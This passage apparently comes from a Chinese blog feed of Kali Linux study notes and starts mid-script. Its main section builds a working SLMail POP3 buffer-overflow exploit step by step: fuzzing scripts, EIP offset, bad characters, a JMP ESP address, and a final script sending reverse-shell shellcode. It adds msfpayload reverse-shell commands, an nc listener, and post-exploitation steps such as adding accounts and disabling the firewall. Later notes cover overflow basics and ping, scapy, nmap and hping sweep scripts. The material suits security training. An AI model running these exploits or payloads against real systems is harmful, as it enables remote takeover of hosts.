    print &quot;Fuzzing PASS with %s bytes&quot;%len(string)
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect=s.connect((&#39;IP地址&#39;,110))
    s.recv(1024)
    s.send(&#39;USER test&#39;+&#39;\r\n&#39;)
    s.recv(1024)
    s.send(&#39;PASS &#39;+string+&#39;\r\n&#39;)
    s.send(&#39;QUIT\r\n&#39;)
    s.close()</code></pre><blockquote>
<pre><code>ImmunityDebugger调试（记录程序的运行状态，为中间数据的拦截、记录）：
1.Open → 打开一个静态的exe文件
2.Attack → 正在运行的程序（通过PID区attack，attack会使进程停止，需点击开始）</code></pre></blockquote>
<h4 id="5-FUZZING"><a href="#5-FUZZING" class="headerlink" title="5. FUZZING"></a>5. FUZZING</h4><ul>
<li>2700个字符实现EIP寄存器溢出</li>
<li><strong><code>🔺命令：./03.py</code></strong></li>
</ul>
<pre><code>#!/usr/bin/python
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer=&#39;A&#39;*2700
try:
    print &quot;\nSending evil buffer...&quot;
    s.connect((&quot;IP地址&quot;,110))
    data=s.recv(1024)
    s.send(&#39;USER test&#39;+&#39;\r\n&#39;)
    data=s.recv(1024)
    s.send(&#39;PASS&#39;+buffer+&#39;\r\n&#39;)
    print &quot;\nDone!&quot;
except:
    print &quot;Could not connect to POP3!&quot;</code></pre><ul>
<li>找到精确溢出的4个字节<ul>
<li>二分法</li>
<li>唯一字串法</li>
<li><strong><code>🔺命令：./usr/share/metasploit-framwork/tools/exploit/pattern_create.rb -l 2700</code></strong></li>
<li><strong><code>🔺命令：./pattern_offset.rb EIP的4个十六进制数字</code></strong>（通过工具找到位置）</li>
<li><strong><code>🔺命令：./04.py</code></strong></li>
</ul>
</li>
</ul>
<pre><code>#!/usr/bin/python
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer=&#39;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9&#39;
try:
    print &quot;\nSending evil buffer...&quot;
    s.connect((&quot;IP地址&quot;,110))
    data=s.recv(1024)
    s.send(&#39;USER test&#39;+&#39;\r\n&#39;)
    data=s.recv(1024)
    s.send(&#39;PASS&#39;+buffer+&#39;\r\n&#39;)
    print &quot;\nDone!&quot;
except:
    print &quot;Could not connect to POP3!&quot;</code></pre><ul>
<li>找到精确溢出的4个字节<ul>
<li><strong><code>🔺命令：./05.py</code></strong></li>
</ul>
</li>
</ul>
<pre><code>#!/usr/bin/python
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer=&#39;A&#39;*2607+&#39;B&#39;*4+&#39;C&#39;*20
try:
    print &quot;\nSending evil buffer...&quot;
    s.connect((&quot;IP地址&quot;,110))
    data=s.recv(1024)
    s.send(&#39;USER test&#39;+&#39;\r\n&#39;)
    data=s.recv(1024)
    s.send(&#39;PASS&#39;+buffer+&#39;\r\n&#39;)
    print &quot;\nDone!&quot;
except:
    print &quot;Could not connect to POP3!&quot;</code></pre><blockquote>
<pre><code>window系统为小端存储形式，低位高地址，高位低地址
EIP为4个十六进制的数字，可通过ASCII换算成字符串
ESP存放着EIP溢出的内容，可以填放shell code作为远程执行代码</code></pre></blockquote>
<h4 id="6-FUZZING"><a href="#6-FUZZING" class="headerlink" title="6. FUZZING"></a>6. FUZZING</h4><ul>
<li>思路：<ul>
<li>将EIP修改为Shellcode代码的内存地址，将Shellcode写入到该地址空间，程序读取EIP寄存器数值，将跳转到Shellcode代码段并执行</li>
</ul>
</li>
<li>寻找可存放Shellcode的内容空间</li>
<li><strong><code>🔺命令：./06.py</code></strong>（查看ESP寄存器可存放多少个字符）</li>
</ul>
<pre><code>#!/usr/bin/python
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer=&#39;A&#39;*2607+&#39;B&#39;*4+&#39;C&#39;*(3500-2607-4)
try:
    print &quot;\nSending evil buffer...&quot;
    s.connect((&quot;IP地址&quot;,110))
    data=s.recv(1024)
    s.send(&#39;USER test&#39;+&#39;\r\n&#39;)
    data=s.recv(1024)
    s.send(&#39;PASS&#39;+buffer+&#39;\r\n&#39;)
    print &quot;\nDone!&quot;
except:
    print &quot;Could not connect to POP3!&quot;</code></pre><h4 id="7-FUZZING"><a href="#7-FUZZING" class="headerlink" title="7. FUZZING"></a>7. FUZZING</h4><ul>
<li>不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途<ul>
<li>返回地址、Shellcode、buffer中都不能出现坏字符</li>
<li>null byte（0x00）空字符，用于终止字符串拷贝的操作</li>
<li>return（0x0D）回车操作，表示POP3 PASS命令输入完成</li>
<li>思路：发送0x00–0xff 256个字符，查找所有的坏字符</li>
<li><strong><code>🔺命令：./07.py</code></strong>（查找坏字符）</li>
<li>0x0A（导致后面数据无法出现）</li>
<li>0x0D（被过滤）</li>
<li>0x00（被过滤）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>字符传进寄存器，可能会被过滤，也可能使服务端carsh</code></pre></blockquote>
<pre><code>#!/usr/bin/python
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
badchars={}
buffer=&#39;A&#39;*2607+&#39;B&#39;*4+badchars
try:
    print &quot;\nSending evil buffer...&quot;
    s.connect((&quot;IP地址&quot;,110))
    data=s.recv(1024)
    s.send(&#39;USER test&#39;+&#39;\r\n&#39;)
    data=s.recv(1024)
    s.send(&#39;PASS&#39;+buffer+&#39;\r\n&#39;)
    print &quot;\nDone!&quot;
except:
    print &quot;Could not connect to POP3!&quot;</code></pre><h4 id="8-FUZZING"><a href="#8-FUZZING" class="headerlink" title="8. FUZZING"></a>8. FUZZING</h4><ul>
<li>重定向数据流<ul>
<li>用ESP的地址替换EIP的值</li>
<li>但是ESP地址变化，硬编码不可行（每次操作系统随机分配）</li>
<li>SLMail线程应用程序，操作系统为每个线程分配一段地址范围，每个线程地址范围使不确定的</li>
</ul>
</li>
<li>变通思路<ul>
<li>在内存中寻找地址固定的系统模块</li>
<li>在模块中寻找JMP ESP指定的地址跳转，再由该指令间接跳转到ESP，从而执行Shellcode</li>
<li>mono.py脚本识别内存模块，搜索”return address”是JMP ESP指令的模块</li>
<li>寻找无DEP、ALSR保护的内存地址</li>
<li>内存地址不包含坏字符</li>
</ul>
</li>
</ul>
<h4 id="9-FUZZING"><a href="#9-FUZZING" class="headerlink" title="9. FUZZING"></a>9. FUZZING</h4><ul>
<li>寻找不受保护的系统模块<ul>
<li>!mona modules</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>Rebase：操作系统重启，内存地址是否发生变化，基地址变化，为False
SafeSEH、ASLR：操作系统提供的内存保护机制，为False
OS DLL：操作系统自带的动态链接库，为True</code></pre></blockquote>
<ul>
<li>将汇编指令JMP ESP转换为二进制<ul>
<li><strong><code>🔺命令：./nasm shell</code></strong></li>
<li>FFE4</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code> msf脚本工具：
 /usr/share/metasploit-framwork/tools/nasm_shell rb（汇编语言转换为二进制）</code></pre></blockquote>
<ul>
<li>在模块中搜索FFE4指令<ul>
<li>！mona find -s “\xFF\xE4”(JMP ESP对应的二进制指令) -m openc32.dll</li>
<li>！mona find -s “\xFF\xE4”(JMP ESP对应的二进制指令) -m mfc42.dll</li>
<li>！mona find -s “\xFF\xE4”(JMP ESP对应的二进制指令) -m slmfc.dll</li>
<li>选择不包含坏字符的内存地址</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>切换汇编语言表示形式：Disassemble
Memory Map内存地址图查看模块对应的基地址是否收到DEP,ALSR的保护，是否需要绕过
▲绕过DEP的一种方法：Menmory Map中的对应的基址的Pocess需为（RE可读可执行）</code></pre></blockquote>
<ul>
<li>在该地址设置断点<ul>
<li>设置断点：右键 → BreakPoint → Memory on acess</li>
<li>Debug → Step info单步执行</li>
</ul>
</li>
<li>重发buffer（小端存储 → 地址完全翻转）<ul>
<li><strong><code>🔺命令：./08.py</code></strong>（查看模块指令的地址是否为ESP的地址）</li>
</ul>
</li>
</ul>
<pre><code>#!/usr/bin/python
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer=&#39;A&#39;*2607+&#39;\x8f\x35\x4a\x5f&#39;+&#39;C&#39;*390
try:
    print &quot;\nSending evil buffer...&quot;
    s.connect((&quot;IP地址&quot;,110))
    data=s.recv(1024)
    s.send(&#39;USER test&#39;+&#39;\r\n&#39;)
    data=s.recv(1024)
    s.send(&#39;PASS&#39;+buffer+&#39;\r\n&#39;)
    print &quot;\nDone!&quot;
except:
    print &quot;Could not connect to POP3!&quot;</code></pre><h4 id="10-FUZZING"><a href="#10-FUZZING" class="headerlink" title="10. FUZZING"></a>10. FUZZING</h4><ul>
<li>生成Shellcode（注意坏字符）</li>
<li>Scratch（写Shellcode的工具）</li>
<li>cd /usr/share/framework2</li>
<li><strong><code>🔺命令：./msfpayload -l</code></strong></li>
<li><strong><code>🔺命令：./msfpayload win32_reverse LHOST=反向IP地址 LPORT=反向端口 C</code></strong></li>
<li><strong><code>🔺命令：./msfpayload win32_reverse LHOST=IP地址 LPORT=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code></strong>（最后需要用”+”进行连接）</li>
</ul>
<blockquote>
<pre><code>win32_adduser 增加用户的Shellcode
win32_bind    增加监听的进程，可以开启相应的端口
▲ 正向的bind基本上会被防火墙过滤
▲ 反向（reserver）的bind，服务端会开放端口，主动连接外部网络
▲ msfencode可对Shellcode做免杀，也可以编掉坏字符，进行编码需要指定原始格式 R</code></pre></blockquote>
<ul>
<li>**`🔺命令：nc -vlp 443</li>
<li><strong><code>🔺命令：./09.py</code></strong>（脚本后门）</li>
</ul>
<pre><code>#!/usr/bin/python
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
shellcode=(
&quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x7c\xac\x3f&quot;+
&quot;\xac\x83\xeb\xfc\xe2\xf4\x80\xc6\xd4\xe1\x94\x55\xc0\x53\x83\xcc&quot;+
&quot;\xb4\xc0\x58\x88\xb4\xe9\x40\x27\x43\xa9\x04\xad\xd0\x27\x33\xb4&quot;+
&quot;\xb4\xf3\x5c\xad\xd4\xe5\xf7\x98\xb4\xad\x92\x9d\xff\x35\xd0\x28&quot;+
&quot;\xff\xd8\x7b\x6d\xf5\xa1\x7d\x6e\xd4\x58\x47\xf8\x1b\x84\x09\x49&quot;+
&quot;\xb4\xf3\x58\xad\xd4\xca\xf7\xa0\x74\x27\x23\xb0\x3e\x47\x7f\x80&quot;+
&quot;\xb4\x25\x10\x88\x23\xcd\xbf\x9d\xe4\xc8\xf7\xef\x0f\x27\x3c\xa0&quot;+
&quot;\xb4\xdc\x60\x01\xb4\xec\x74\xf2\x57\x22\x32\xa2\xd3\xfc\x83\x7a&quot;+
&quot;\x59\xff\x1a\xc4\x0c\x9e\x14\xdb\x4c\x9e\x23\xf8\xc0\x7c\x14\x67&quot;+
&quot;\xd2\x50\x47\xfc\xc0\x7a\x23\x25\xda\xca\xfd\x41\x37\xae\x29\xc6&quot;+
&quot;\x3d\x53\xac\xc4\xe6\xa5\x89\x01\x68\x53\xaa\xff\x6c\xff\x2f\xef&quot;+
&quot;\x6c\xef\x2f\x53\xef\xc4\xbc\x04\x5b\xc6\x1a\xc4\x3e\x17\x1a\xff&quot;+
&quot;\xb6\x4d\xe9\xc4\xd3\x55\xd6\xcc\x68\x53\xaa\xc6\x2f\xfd\x29\x53&quot;+
&quot;\xef\xca\x16\xc8\x59\xc4\x1f\xc1\x55\xfc\x25\x85\xf3\x25\x9b\xc6&quot;+
&quot;\x7b\x25\x9e\x9d\xff\x5f\xd6\x39\xb6\x51\x82\xee\x12\x52\x3e\x80&quot;+
&quot;\xb2\xd6\x44\x07\x94\x07\x14\xde\xc1\x1f\x6a\x53\x4a\x84\x83\x7a&quot;+
&quot;\x64\xfb\x2e\xfd\x6e\xfd\x16\xad\x6e\xfd\x29\xfd\xc0\x7c\x14\x01&quot;+
&quot;\xe6\xa9\xb2\xff\xc0\x7a\x16\x53\xc0\x9b\x83\x7c\x57\x4b\x05\x6a&quot;+
&quot;\x46\x53\x09\xa8\xc0\x7a\x83\xdb\xc3\x53\xac\xc4\xcf\x26\x78\xf3&quot;+
&quot;\x6c\x53\xaa\x53\xef\xac&quot;)
buffer=&#39;A&#39;*2607+&#39;\x8f\x35\x4a\x5f&#39;+&#39;\x90&#39;*8+shellcode
try:
    print &quot;\nSending evil buffer...&quot;
    s.connect((&quot;IP地址&quot;,110))
    data=s.recv(1024)
    s.send(&#39;USER test&#39;+&#39;\r\n&#39;)
    data=s.recv(1024)
    s.send(&#39;PASS&#39;+buffer+&#39;\r\n&#39;)
    print &quot;\nDone!&quot;
except:
    print &quot;Could not connect to POP3!&quot;</code></pre><blockquote>
<pre><code>汇编语言的\0x90，表示NOP（不操作），为了保证Shellcode运行有效性，从经验上来谈，CPU在跳转解析的时候，可能会擦除，覆盖Shellcode的前几个字符，所以需要加NOP进行不操作</code></pre></blockquote>
<h4 id="11-FUZZING"><a href="#11-FUZZING" class="headerlink" title="11. FUZZING"></a>11. FUZZING</h4><ul>
<li>早期的msfpayload<ul>
<li>Shellcode执行后会一ExitProcess方式退出整个进程，将导致邮件服务崩溃</li>
<li>SLMail是一个基于线程的应用，适用ExitThread方式可以避免整个系统崩溃，可实现重复溢出</li>
<li><strong><code>🔺命令：./msfpayload win32_reverser LHOST=反向IP地址 EXITFUNC=thread LPORT=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code></strong></li>
</ul>
</li>
</ul>
<h4 id="12-FUZZING"><a href="#12-FUZZING" class="headerlink" title="12. FUZZING"></a>12. FUZZING</h4><blockquote>
<pre><code>1.修改注册表开启远程桌面控制后需重启计算机（shutdown -r -t 0）
2.查看远程桌面是否开启（我的电脑 → 属性 → 远程）
3.apt-get install rdesktop
4.rdesktop 远程IP
5.nc -vlp 443 
6.增加用户（net user 用户 密码 /add）
▲ 可以通过注册表关闭防火墙（regsnap可抓取注册表变化）</code></pre></blockquote>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(二十六)：缓冲区溢出介绍</title>
    <url>/2019/12/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%85%AD)%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<hr>
<h4 id="1-程序漏洞从哪里来（程序的动态，变量）"><a href="#1-程序漏洞从哪里来（程序的动态，变量）" class="headerlink" title="1. 程序漏洞从哪里来（程序的动态，变量）"></a>1. 程序漏洞从哪里来（程序的动态，变量）</h4><ul>
<li>罪恶的根源：变量</li>
<li>数据与代码边界不清（输入数据或者代码）</li>
<li>最简漏洞原理–shell脚本漏洞<ul>
<li><strong><code>🔺命令：./a.sh 参数</code></strong>（; | &amp;&amp; &amp;）</li>
</ul>
</li>
</ul>
<pre><code>#!/bin/bash
echo $1</code></pre><blockquote>
<pre><code>./a.sh ; pwd →  /root</code></pre></blockquote>
<h4 id="2-缓存区溢出"><a href="#2-缓存区溢出" class="headerlink" title="2. 缓存区溢出"></a>2. 缓存区溢出</h4><ul>
<li>当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓存区“撑爆”，从而覆盖了相邻内存区域的数据；</li>
<li>成功修改内存数据，可造成进程劫持，执行恶意代码，获取服务器控制权限等后果</li>
</ul>
<h4 id="3-如何发现漏洞"><a href="#3-如何发现漏洞" class="headerlink" title="3. 如何发现漏洞"></a>3. 如何发现漏洞</h4><ul>
<li>源码审计（源码 → 使用了不安全的函数，对用户数据进行过滤，编码）</li>
<li>逆向工程（打包后的程序 → 反汇编 ）</li>
<li>模糊测试（在新的OS环境中，在OS中进行安装，用工具进行监视，调试，插入）<ul>
<li>向程序堆栈半随机的数据，根据内存变化判断溢出</li>
<li>数据生成器：生成随机，半随机数据（编程语言实现打向程序）</li>
<li>测试工具：识别溢出漏洞（动态调试工具）</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(十五)：主机发现--三层发现</title>
    <url>/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%BA%94)%EF%BC%9A%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0--%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0/</url>
    <content><![CDATA[<hr>
<h4 id="1-发现-三层发现（ping）"><a href="#1-发现-三层发现（ping）" class="headerlink" title="1. 发现-三层发现（ping）"></a>1. 发现-三层发现（ping）</h4><ul>
<li>优点<ul>
<li>可路由</li>
<li>速度比较快</li>
</ul>
</li>
<li>缺点<ul>
<li>速度比二层慢</li>
<li>经常被边界防火墙过滤（目标系统的过滤机制）</li>
</ul>
</li>
<li>IP、ICMP协议</li>
</ul>
<blockquote>
<pre><code>ICMP协议，网络控制管理协议，路径发现，探测，根据相应结果来反应目标主机的状态
ICMP协议，发送端的报文类型是询问报文，Type字段为8，接收端为0
网络上默认禁止ICMP的探测数据包，所以导致扫描结果不准确，存在误报，漏报，错报</code></pre></blockquote>
<ul>
<li><strong><code>🔺命令：Ping IP地址 -c 2</code></strong></li>
<li><strong><code>🔺命令：Ping -R（路由追踪） IP地址 / traceroute IP地址</code></strong></li>
<li><strong><code>🔺命令：ping  IP地址 -c 1 | grep &quot;bytes from&quot; | awk &#39;{print $4}&#39;</code></strong></li>
<li>脚本<ul>
<li><strong><code>🔺命令：./pinger.sh IP网段</code></strong>  ▲2019.12.2 iplist文档中ip地址后面有：，还无法去除</li>
</ul>
</li>
</ul>
<pre><code>#!/bin/bash
if [ &quot;$#&quot; -ne 1 ];then
    echo &quot;Usage - ./pinger.sh [/24 network address]&quot;
    echo &quot;Example - ./pinger.sh 192.168.100.0&quot;
    echo &quot;Example will perform an ICMP ping scan of the 192.168.100.0/24 network&quot;
    exit
fi
prefix=$(echo $1 | cut -d &quot;.&quot; -f 1-3)
for add in $(seq 1 254);do
  ping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | awk &#39;{print $4}&#39;  &amp;
done</code></pre><blockquote>
<pre><code>Linux/Unix数据包的TTL值默认为64
ping -R 请求离主机比较远的网卡的IP地址（同个路由器）
traceroute 请求离主机比较近的网卡的IP地址（同个路由器）</code></pre></blockquote>
<h4 id="2-发现-三层发现（Scapy）"><a href="#2-发现-三层发现（Scapy）" class="headerlink" title="2. 发现-三层发现（Scapy）"></a>2. 发现-三层发现（Scapy）</h4><ul>
<li>Scapy<ul>
<li>OSI多层堆叠手工声称ICMP包-IP/ICMP包</li>
<li>ip=IP()</li>
<li>icmp=ICMP()</li>
<li>ping=(ip/icmp)</li>
<li>ping[IP].dst=”IP地址”</li>
<li>a=sr1(ping)</li>
<li>a.dispaly</li>
<li>Ping不存在的地址：a=sr1(ip/icmp,timeout=1)</li>
<li>a=sr1(IP(dst=”IP地址”)/ICMP(),timeout=1)  //一句话实现</li>
</ul>
</li>
<li><strong><code>🔺命令：./pinger1.py IP网段&gt;iplist.txt</code></strong></li>
</ul>
<pre><code>#!/usr/bin/python
import logging
import subprocess
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
from scapy.all import *

if len(sys.argv)!=2:
    print &quot;Usage - ./pinger1.py [/24 network address]&quot;
    print &quot;Example - ./pinger1.py 192.168.100.0&quot;
    print &quot;Example will perform an ICMP ping scan of the 192.168.100.0/24 network&quot;
    sys.exit()

address=str(sys.argv[1])
prefix=address.split(&quot;.&quot;)[0]+&quot;.&quot;+address.split(&quot;.&quot;)[1]+&quot;.&quot;+address.split(&quot;.&quot;)[2]+&quot;.&quot;

for addr in range(1,254):
     a=sr1(IP(dst=prefix+str(addr))/ICMP(),timeout=1,verbose=0)
     if a==None:
       pass
     else:
       print prefix+str(addr)</code></pre><ul>
<li><strong><code>🔺命令：./pinger2.py iplist.txt</code></strong></li>
</ul>
<pre><code>#!/usr/bin/python
import logging
import subprocess
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
from scapy.all import *

if len(sys.argv)!=2:
    print &quot;Usage - ./pinger2.py [iplist.txt]&quot;
    print &quot;Example - ./pinger2.py iplist.txt&quot;
    print &quot;Example will perform an ICMP ping scan of the 192.168.100.0/24 network&quot;
    sys.exit()

filename=str(sys.argv[1])
file=open(filename,&quot;r&quot;)

for addr in file:
    a=sr1(IP(dst=addr.strip())/ICMP(),timeout=0.1,verbose=0)
    if a==None:
      pass
    else:
      print addr.strip()</code></pre><h4 id="3-发现-三层发现（nmap）"><a href="#3-发现-三层发现（nmap）" class="headerlink" title="3. 发现-三层发现（nmap）"></a>3. 发现-三层发现（nmap）</h4><ul>
<li><strong><code>🔺命令：nmap IP地址-254 -sn</code></strong>（同网段是发ARP包，不同网段是发ICMP包）</li>
<li><strong><code>🔺命令：nmap -iL iplist.txt -sn</code></strong></li>
</ul>
<blockquote>
<pre><code>namp -sn对于同网段是发ARP包和DNS包，不同网段是发ICMP包（请求字段为时间戳13和请求包8）、DNS包和TCP包 </code></pre></blockquote>
<h4 id="4-发现-三层发现（fping）"><a href="#4-发现-三层发现（fping）" class="headerlink" title="4. 发现-三层发现（fping）"></a>4. 发现-三层发现（fping）</h4><ul>
<li><strong><code>🔺命令：fping IP地址 -c 1</code></strong></li>
<li><strong><code>🔺命令：fping -g 起始IP地址 最后IP地址（IP地址段）-c 1</code></strong></li>
<li><strong><code>🔺命令：fping -g IP网段/24</code></strong>  ▲2019.12.2过滤输出格式不对</li>
<li><strong><code>🔺命令：fping -f iplist.txt</code></strong></li>
</ul>
<h4 id="5-发现-三层发现（Hping）"><a href="#5-发现-三层发现（Hping）" class="headerlink" title="5. 发现-三层发现（Hping）"></a>5. 发现-三层发现（Hping）</h4><ul>
<li>Hping（几乎可以完成所以IP、TCP协议包头的组合，也可对于基于TCP服务器进行压力测试）<ul>
<li>能够发生几乎所有任意TCP/IP包</li>
<li>功能强大但每次只能扫描一个目标</li>
</ul>
</li>
<li><strong><code>🔺命令：hping3 IP地址 --icmp -c 2</code></strong></li>
<li><strong><code>🔺命令：for addr in $(seq 1 254); do hping3 1.1.1.$addr --icmp -c 1 &gt;&gt; handle.txt &amp; done</code></strong></li>
<li><strong><code>🔺命令：cat handle.txt |  grep ^len</code></strong></li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(十四)：主机发现--二层发现</title>
    <url>/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E5%9B%9B)%EF%BC%9A%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0--%E4%BA%8C%E5%B1%82%E5%8F%91%E7%8E%B0/</url>
    <content><![CDATA[<hr>
